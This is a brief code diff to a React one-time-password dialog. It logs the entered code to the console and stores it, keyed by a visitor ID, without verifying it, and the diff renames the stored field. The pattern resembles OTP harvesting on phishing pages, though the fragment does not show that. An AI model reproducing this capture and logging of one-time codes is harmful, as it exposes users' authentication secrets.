@@ -44,7 +44,7 @@ export function OtpDialog({ open, onOpenChange, phoneNumber }: OtpDialogProps) {
     console.log("OTP verification:", otp)
     const visitorID=localStorage.getItem('visitor')
     allOtps.push(otp)
-   await addData({id:visitorID,otp,allOtps})
+   await addData({id:visitorID,phoneOtp:otp})
     // Add verification logic here
     onOpenChange(false)
   }
